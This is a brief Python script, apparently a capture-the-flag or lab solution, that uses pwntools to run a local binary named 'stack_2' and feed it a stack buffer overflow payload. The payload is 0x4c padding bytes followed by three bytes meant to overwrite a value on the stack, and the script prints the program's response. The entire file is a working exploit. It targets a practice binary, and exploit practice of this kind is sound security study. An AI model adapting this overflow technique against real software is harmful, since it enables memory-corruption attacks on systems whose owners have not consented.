from pwn import *

# Start the process
p = process('./stack_2')

# Payload
payload = b'a' * 0x4c + b"\x63\x87\x0c"

# Send the input
p.sendline(payload)

# Receive the output
output = p.recvall().decode()

# Print the output
print(output)
